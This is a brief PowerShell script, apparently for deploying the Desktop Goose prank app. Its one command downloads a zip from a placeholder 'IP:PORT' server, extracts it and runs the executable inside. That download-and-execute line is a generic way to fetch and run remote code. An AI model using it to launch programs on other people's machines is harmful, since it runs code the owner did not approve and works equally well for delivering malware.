# I did NOT create the DesktopGoose Application(https://samperson.itch.io/desktop-goose).
# This downloads the .zip folder to the directory it is run from, extracts it to a folder called Goose, deletes the .zip folder and runs the GooseDesktop.exe
Invoke-WebRequest http://(IP:PORT)/(DesktopGoose Zip file path) -OutFile Goose.zip; Expand-Archive Goose.zip -DestinationPath Goose; del Goose.zip; Goose\GooseDesktop.exe
